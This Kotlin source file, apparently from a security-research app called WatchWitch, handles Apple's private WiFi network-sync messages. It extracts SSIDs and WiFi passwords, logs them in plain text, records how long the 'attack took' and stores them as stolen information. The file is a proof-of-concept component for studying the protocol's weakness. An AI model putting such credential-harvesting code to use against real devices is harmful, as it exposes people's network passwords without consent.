package net.rec0de.android.watchwitch.servicehandlers

import net.rec0de.android.watchwitch.Log
import net.rec0de.android.watchwitch.ServiceReferences
import net.rec0de.android.watchwitch.WatchState
import net.rec0de.android.watchwitch.alloy.AlloyHandler
import net.rec0de.android.watchwitch.alloy.AlloyMessage
import net.rec0de.android.watchwitch.alloy.AlloyService
import net.rec0de.android.watchwitch.alloy.DataMessage
import net.rec0de.android.watchwitch.decoders.bplist.BPAsciiString
import net.rec0de.android.watchwitch.decoders.bplist.BPListParser
import net.rec0de.android.watchwitch.decoders.bplist.NSArray
import net.rec0de.android.watchwitch.decoders.bplist.NSDict
import java.util.Date

object NetworkSync : AlloyService {

    override val handlesTopics = listOf("com.apple.private.alloy.wifi.networksync")
    private const val TAG = "NetworkSync"

    override fun acceptsMessageType(msg: AlloyMessage) = msg is DataMessage
    override fun acceptsLocalDeviceRole(device: AlloyService.Device) = true

    override fun receiveMessage(msg: AlloyMessage, handler: AlloyHandler) {
        if(msg !is DataMessage)
            throw Exception("NetworkSync expects DataMessage but got $msg")

        val parsed = BPListParser().parse(msg.payload)
        val messages: List<NSDict> = when (parsed) {
            is NSDict -> listOf(parsed)
            is NSArray -> parsed.values.map { it as NSDict }
            else -> {
                Log.d(TAG, "unexpected BPList data: $parsed")
                return
            }
        }

        val info = mutableSetOf<String>()

        messages.forEach {
            if(it.values.containsKey(BPAsciiString("SSID_STR"))) {
                val ssid = (it.values[BPAsciiString("SSID_STR")] as BPAsciiString).value
                val pw = (it.values[BPAsciiString("WiFiNetworkPasswordString")] as BPAsciiString?)?.value

                Log.d(TAG, "got WiFi info: $ssid / $pw")
                info.add("WiFi: $ssid, pw: $pw")

                if(pw != null && ServiceReferences.endTime == 0L) {
                    ServiceReferences.endTime = Date().time
                    Log.big(TAG, "attack took ${ServiceReferences.endTime - ServiceReferences.startTime} ms")
                }
            }
        }

        WatchState.addStolenInfo(info)
    }
}